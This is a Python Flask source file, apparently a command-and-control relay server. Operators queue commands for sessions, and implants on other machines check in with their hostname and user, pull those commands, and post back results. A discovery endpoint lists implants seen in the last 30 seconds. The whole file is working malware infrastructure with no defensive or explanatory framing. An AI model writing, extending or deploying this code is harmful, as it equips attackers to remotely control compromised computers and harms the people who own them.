# relay.py
from flask import Flask, request, jsonify
import time, threading

app = Flask(__name__)

command_queue = {}
response_queue = {}
active_sessions = {}

locks = {
    "command": threading.Lock(),
    "response": threading.Lock(),
    "session": threading.Lock()
}

@app.route('/c2/task', methods=['POST'])
def handle_c2_task():
    data = request.json
    session_id = data.get("session_id")
    command = data.get("command")
    if not all([session_id, command]):
        return jsonify({"status": "error", "message": "session_id and command are required"}), 400
    with locks["command"]:
        command_queue.setdefault(session_id, []).append(command)
    return jsonify({"status": "tasked"})

@app.route('/implant/hello', methods=['POST'])
def handle_implant_hello():
    data = request.json
    session_id = data.get("session_id")
    if not session_id:
        return jsonify({"error": "session_id is required"}), 400
    with locks["session"]:
        active_sessions[session_id] = {
            "last_seen": time.time(),
            "hostname": data.get("hostname"),
            "user": data.get("user")
        }
    with locks["command"]:
        commands_to_execute = command_queue.pop(session_id, [])
    return jsonify({"commands": commands_to_execute})

@app.route('/implant/response', methods=['POST'])
def handle_implant_response():
    data = request.json
    session_id = data.get("session_id")
    if not session_id:
        return jsonify({"error": "session_id is required"}), 400
    with locks["response"]:
        response_queue.setdefault(session_id, []).append(data)
    return jsonify({"status": "ok"})

@app.route('/c2/get_responses', methods=['POST'])
def get_c2_responses():
    session_id = request.json.get("session_id")
    if not session_id: return jsonify({"error": "session_id is required"}), 400
    with locks["response"]:
        responses = response_queue.pop(session_id, [])
    return jsonify({"responses": responses})

@app.route('/c2/discover', methods=['GET'])
def discover_sessions():
    live_sessions = {}
    timeout_threshold = time.time() - 30 
    with locks["session"]:
        # Create a copy of items to avoid runtime errors during iteration
        for sid, data in list(active_sessions.items()):
            if data["last_seen"] > timeout_threshold:
                live_sessions[sid] = data
            else:
                # Remove timed-out sessions
                del active_sessions[sid]
    return jsonify({"sessions": live_sessions})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)